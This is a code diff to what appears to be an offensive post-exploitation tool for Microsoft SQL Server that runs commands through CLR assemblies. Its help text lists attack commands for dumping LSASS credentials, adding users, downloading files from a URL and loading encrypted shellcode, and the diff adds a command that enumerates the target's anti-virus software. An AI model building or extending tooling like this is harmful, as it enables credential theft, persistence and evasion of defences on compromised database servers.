@@ -31,6 +31,7 @@ disable_clr                - you know what it means
 install_clr                - create assembly and procedure
 uninstall_clr              - drop clr
 clr_dumplsass              - dumplsass by clr
+clr_getav                  - get anti-virus software on this machin by clr
 clr_adduser {user} {pass}  - add user by clr
 clr_download {url} {path}  - download file from url by clr
 clr_scloader {code} {key}  - Encrypt Shellcode by Encrypt.py (only supports x64 shellcode.bin)
@@ -332,6 +333,9 @@ exit                       - terminates the server process (and this session)"
                         case "clr_dumplsass":
                             clr_exec("clr_dumplsass");
                             break;
+                        case "clr_getav":
+                            clr_exec("clr_getav");
+                            break;
                         case "clr_adduser":
                             {
                                 String s = String.Empty;
@@ -473,6 +477,9 @@ exit                       - terminates the server process (and this session)"
                         break;
                     case "clr_dumplsass":
                         clr_exec("clr_dumplsass");
+                        break;
+                    case "clr_getav":
+                        clr_exec("clr_getav");
                         break;
                     case "clr_adduser":
                         {
